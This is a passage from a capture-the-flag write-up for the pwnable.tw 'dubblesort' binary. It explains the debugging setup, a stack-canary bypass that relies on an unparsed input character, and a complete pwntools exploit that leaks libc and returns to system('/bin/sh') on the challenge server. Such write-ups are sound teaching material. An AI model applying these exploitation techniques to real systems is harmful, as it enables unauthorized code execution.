`0xff8e7440`, along with 2 preceding `libc` addresses. 
Note, that doing this large overwrite is preferred, as this way there's lesser chance of one of the randomized bytes in between to be a null termination, 
possibly truncation the output and damaging the exploit's statistics. \
Interestingly, upon remote-debugging the binary, I've noticed the stack layout was completely different. 
I've sent a single `'A'` character, and got the following:

```bash
[*] leak: 0xf76dd041
[*] leak: 0xffef0f21                                                 [*] leak: 0x6f482c2f
[*] leak: 0x616d2077
[*] leak: 0x6e20796e
[*] leak: 0x65626d75
[*] leak: 0x64207372
[*] leak: 0x6f79206f
[*] leak: 0x68772075
[*] leak: 0x74207461
[*] leak: 0x6f73206f
[*] leak: 0x3a207472
```

This means that the first dword is a libc leak, and the second - a stack leak. \
Moreover, the preceding string `"How many numbers do you what to sort :"` actually resides within the stack!.
Hence, it seems to be copied from the .rodata segment, probably as part of the `FORTIFY_SOURCE` extra runtime checks. \
Unfortunately, even though I've used the same `libc` version, and a matching `ld`, a similar yet different stack layout was produced.
I assume the usage of `patchelf` have completely changed the `.rodata` segment, hence produced completely different stack state. \
Hence, my next debugging step was to setup a relevant ubuntu-xenial docker image. \
I've wrote the following `Dockerfile`:

```bash
FROM ubuntu:xenial@sha256:bcb8397f1390f4f0757ca06ce184f05c8ce0c7a4b5ff93f9ab029a581192917b
ARG id=1000
ARG user=dubblesort

RUN apt-get update && \
        apt-get install -y sudo binutils curl gdb gdbserver && \
        addgroup --gid $id $user && \
        adduser --uid $id --gid $id --disabled-password --gecos "" $user && \
        echo '${user} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

COPY ./ld-2.23.so /lib/ld-linux.so.2
COPY ./libc_32.so.6 /lib/i386-linux-gnu/libc.so.6

USER ${user}
WORKDIR /home/${user}
COPY --chown=${user}:${user} ./dubblesort /home/${user}/dubblesort
```

And built it via `sudo docker build -t ubuntu-dubblesort .` . Notice - I must've changed to `uid=1000` user. 
Otherwise, spawned processes within the docker image were treated as root's. 

After building the image, I've created and runned the container:

```bash
sudo docker run -p 9090:9090 --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --name xenial ubuntu-dubblesort
```

That way, **we do not use patchelf at all**, hence - running the original binary, with its original libc, and an adequate `ld`! \
Keep in mind, that the exact `ld + libc` pair must be used. Otherwise, the docker machine would be wrecked, 
and even calls to `ls` would segfault. \
Notice that the docker approach requires us to also set a remote gdb server, which may be an headache. 

Another alternative, is to debug on the host machine, using overwritten `ld` and `libc`:

```python
p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
```

Because this is the simplest solution, and it doesn't patches the ELF at all, I've chose this route :) \
Notice that the gdb script doesn't naively works. Because we've changed the loader, the first instruction that we're 
being breaked at, is the custom loader's entry point. Hence, at this point our binary wasn't even loaded to memory, 
and we cannot break on `_start`:

```bash
pwndbg> info proc mappings
process 47372
Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
        0xf2bbd000 0xf2bc1000     0x4000        0x0  r--p   [vvar]
        0xf2bc1000 0xf2bc3000     0x2000        0x0  r-xp   [vdso]
        0xf2bc3000 0xf2be5000    0x22000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xf2be6000 0xf2be8000     0x2000    0x22000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xffb88000 0xffba9000    0x21000        0x0  rw-p   [stack]
pwndbg> p $eip
$1 = (void (*)()) 0xf2bc3ac0
```

Indeed, `readelf -h ./ld-2.23.so` shows that the loader's entry point is indeed `0xac0`. \
A very cool trick we can do, in order to properly debug the binary, is to issue the following gdb script:

```bash
ni
ni
fin
```

By doing so, we enter the first new function frame called by the loader (which is the main routine that loads the binary),
and by calling `fin` - we wait just after the binary was successfully loaded:

```bash
pwndbg> info proc mappings
process 47442
Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
        0xecdd6000 0xecdd7000     0x1000        0x0  rw-p
        0xecdd7000 0xecf84000   0x1ad000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf84000 0xecf85000     0x1000   0x1ad000  ---p   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf85000 0xecf87000     0x2000   0x1ad000  r--p   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf87000 0xecf88000     0x1000   0x1af000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf88000 0xecf8d000     0x5000        0x0  rw-p
        0xecf8d000 0xecf8e000     0x1000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/dubblesort
        0xecf8e000 0xecf8f000     0x1000        0x0  r--p   /home/itay/projects/pwnable_tw/dubblesort/dubblesort
        0xecf8f000 0xecf90000     0x1000     0x1000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/dubblesort
        0xecf90000 0xecf94000     0x4000        0x0  r--p   [vvar]
        0xecf94000 0xecf96000     0x2000        0x0  r-xp   [vdso]
        0xecf96000 0xecfb8000    0x22000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xecfb8000 0xecfb9000     0x1000        0x0  rw-p
        0xecfb9000 0xecfba000     0x1000    0x22000  r--p   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xecfba000 0xecfbb000     0x1000    0x23000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xffd72000 0xffd93000    0x21000        0x0  rw-p   [stack]
```

Cool, now we can put breakpoints on our program's addresses :)
However, we haven't done yet! Because there are no binary debugging symbols, we cannot simply `bp main / _start`! 
The trick is to break on a libc address, and `__libc_start_main` in particular, and fetch `main`'s address off the stack. \
TL;DR : the following script would allow us to break on `main`:

```bash
GDB_SCRIPT = '''
ni
ni
fin
tb __libc_start_main
commands
    p/x *(int *)($esp + 4)
    b *$1
    c
end

c
'''
```



Also notice that the first 4 bytes of `libc` leak were still not reproduced on local debug. 
I assume it is related to the environment `LD_PRELOAD` being on the stack, changing some of the offsets there. 
We can still debug without the `libc` leak, but we have to keep in mind we have to find the exact offset on the remote. \
An example run gave me the following libc leak on the remote, `0xf76df041` (0x41 is our inserted 'A'). 


#### Stack Write

The main vulnerability of this challenge seems to be the fact that we can write infinite amount of numbers to the 8-slot size array, and sort all of them. \
This means the primitive is pretty limited - we can write any data we want into the stack, but it would get sorted, being interpreted as 4-byte uints. \
The main obstacle is the fact that while we want to overwrite the return address and perform easy-win ROP (by jumping to `libc`), 
the stack canary wrecks us. \
There are few possible cool ideas:

1. If theres a stack canary somewhere upper in the stack, such as due to some other function call, we may simply sort it to our desired slot!

2. While we corrupt the outermost main's frame stack, notice the inner function that actually performs the sort, is also guarded with a stack canary - and this is the exact same canary. Hence, if we can make sure the innermost frame would get sorted, such that the inner frame's canary would be written at the outer frame's canary address, we would bypass this check. 

3. Recall the usage of a bad character, such as `'A'`, being parsed by `printf("%u")`. In that case, **the character would remain within the IO-stdin buffer, while leaving the corresponding memory untouched**. We can exploit this mechanism, such that the canary won't be overwritten, yet we would write libc addresses past it!

After some debugging, I've chose option(3), which is a very cool vuln. \
Simply setting small ROP chain to jump back to libc, and we get a shell. 

### Solution

The following script works both locally and remote :) \
Notice that because the canary's value is randomized, it is being sorted to different addresses. 
Hence, this have to be runned multiple times to obtain the flag. 

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10101
context.arch='i386'
BINARY = './dubblesort'
LIBC = './libc.so.6'
LD = './ld-2.23.so'
# GDB_SCRIPT = '''
# ni
# ni
# fin
# tb __libc_start_main
# commands
#     p/x *(int *)($esp + 4)
#     b *$1
#     c
# end

# c
# '''

GDB_SCRIPT = '''
b *main-0x9c3+0x965

c
'''

# Constants
IS_DEBUG = False 
IS_REMOTE = True
NAME_LEAK_SIZE = 0x19 if IS_DEBUG else 0x1d
NUMBERS_SIZE = 0x18

# Offsets
LIBC_LEAK_TO_BASE = 0x1b0000

# Addresses
libc = ELF(LIBC)
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
log.info(f'bin_sh: {hex(bin_sh)}')
log.info(f'system: {hex(system)}')

libc_rop = ROP(LIBC)
pop_eax_ret = libc_rop.eax.address
pop_ebx_ret = libc_rop.ebx.address
pop_ecx_ret = libc_rop.ecx.address
pop_edx_ret = libc_rop.edx.address
leave_ret = libc_rop.find_gadget(['leave']).address
int_80 = libc_rop.find_gadget(['int 0x80']).address
log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
log.info(f'leave_ret: {hex(leave_ret)}')
log.info(f'int_80: {hex(int_80)}')

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def recvPointer(p, sizeof_ptr = 4):
    leak = p.recv(sizeof_ptr)
    assert(len(leak) == sizeof_ptr)
    leak = u32(leak)
    return leak

def get_libc_base(p):
    p.recvuntil(b'What your name :')
    name = b'A' * NAME_LEAK_SIZE
    p.send(name)
    p.recvuntil(b'Hello ' + name[:-1])
    
    libc_leak = recvPointer(p) - ord('A')
    libc_base = libc_leak - LIBC_LEAK_TO_BASE
    log.info(f'libc_leak: {hex(libc_leak)} libc_base: {hex(libc_base)}')
    assert((libc_base & 0xfff) == 0)

    p.recvuntil(b',How many numbers do you what to sort :')
    return libc_base 

def sendNumbers(p, nums, size):
    p.sendline(str(size).encode())
    p.recvuntil(b'Enter the 0 number : ')
    buf = b''
    for num in nums:
        buf += str(num).encode() + b' '
   
    # Critical - printf("%u") fails parsing this character, leaving uninitialized memory, while the character remains within the stdin buffer!
    buf += b'A'  
    p.sendline(buf)

def exploit(p):
    libc_base = get_libc_base(p)
    # This number is larger than the canary, yet smaller than all of libc's addresses
    large_num = libc_base - 0x1000

    # First, fill crap
    libc_bin_sh = libc_base + bin_sh
    libc_system = libc_base + system
    nums = [libc_system] * 7 + [libc_bin_sh] * 9
    nums += [1] * (NUMBERS_SIZE - len(nums))

    sendNumbers(p, nums, len(nums) + 32)


def main():
    if IS_DEBUG:
        # p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
        # pid = int(process('pgrep -f "./dubblesort"', shell=True).readline()[:-1])
        # p = gdb.attach(pid, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process([LD, BINARY], env={"LD_PRELOAD": LIBC})

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## hacknote

TODO

[elf-start]: http://www.dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
[glibc-all-in-one]: https://github.com/matrix1001/glibc-all-in-one
